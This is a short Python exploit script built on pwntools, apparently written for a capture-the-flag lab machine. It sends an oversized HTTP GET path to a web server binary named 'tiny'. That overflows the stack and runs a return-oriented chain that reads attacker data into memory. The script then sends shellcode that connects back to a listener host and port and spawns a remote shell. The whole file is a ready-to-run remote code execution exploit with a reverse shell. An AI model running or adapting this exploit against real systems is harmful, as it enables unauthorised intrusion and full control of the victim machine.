#!/usr/bin/python
#Stack Smasher
#@authors BBerryNZ, M4lvoid, alamot, filippos, delo

from pwn import *
import urllib

class exploit():

	def __init__(self, rhost, rport, lhost, lport):
		self.rhost = rhost
		self.rport = rport
		self.lhost = lhost
		self.lport = lport
		self.elf = context.binary = ELF('./tiny', checksec=False)


	def generatePayload(self):
		BSS = self.elf.get_section_by_name(".bss")["sh_addr"]

		payload = "A"*568
		payload += p64(0x00000000004011dd)
		payload += p64(4)
		payload += p64(0x00000000004011db)
		payload += p64(BSS)
		payload += 'B'*8
		payload += p64(self.elf.plt.read)
		payload += p64(BSS)

		return payload

	def smash(self):
		r = remote(self.rhost, self.rport)

		#Generate Payload
		payload = self.generatePayload()

		log.info('Sending Payload')
		r.send('GET /{} HTTP/1.1\r\n\r\n'.format(urllib.quote(payload)))
		log.info('Payload Sent')

		log.info('Sending Shellcode')
		shell = shellcraft.amd64.linux.connect(self.lhost, self.lport)
		shell += shellcraft.amd64.linux.dupsh()
		r.sendline(asm(shell))
		log.info('Shellcode Sent')
		log.success('Success!')


def main():
	#Modify RHOST, RPORT, LHOST, LPORT
	e = exploit("10.10.10.89", 1111, "10.10.14.4", 4444)
	e.smash()

if __name__ == "__main__":
	main()
